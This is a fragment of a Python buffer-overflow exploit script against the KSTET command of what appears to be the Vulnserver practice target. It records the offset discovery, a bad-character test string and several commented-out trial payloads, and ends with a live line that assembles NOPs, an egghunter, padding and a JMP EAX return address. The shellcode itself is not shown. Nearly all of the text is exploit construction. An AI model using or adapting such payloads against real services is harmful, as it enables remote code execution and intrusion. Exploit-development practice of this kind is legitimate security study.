...
badchar = ("W00T"+"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
...
#Exact match at offset 70 of 107

#muha="KSTET "+"\x41"*70+"\x42" * 4+ "\x43"*(107-70-4)  #70 offset 
#muha="KSTET "+unique_107 #identiy character length
#muha="KSTET "+badchar #weird seems to be truncating input


#JMP EAX 625011B1
#muha="KSTET "+"\x41"*70+"\xB1\x11\x50\x62"+ "\x43"*(107-70-4)

#70 4B to jump to next open space
#muha="KSTET "+"\x70\x4B\x71\x4B"+"\x41"*66+"\xB1\x11\x50\x62"+ "\x43"*(107-70-4)  #removed 4 bytes in put in short jumps

#muha="KSTET "+"\x41"*(70)+"\xB1\x11\x50\x62"+ "\x43"*(107-70-4) 

#muha="KSTET "+egghunter+"\x41"*(70-len(egghunter))+"\xB1\x11\x50\x62"+ "\x43"*(107-70-4)  #removed 4 bytes in put in short jumps


muha="KSTET  "+NOPS+egghunter+"\x41"*(70-len(egghunter)-len(NOPS)-1)+"\xB1\x11\x50\x62"+ "\x43"*(107-70-4)  #removed 4 bytes in put in short jumps, minus 1 due to extra space for KSTET
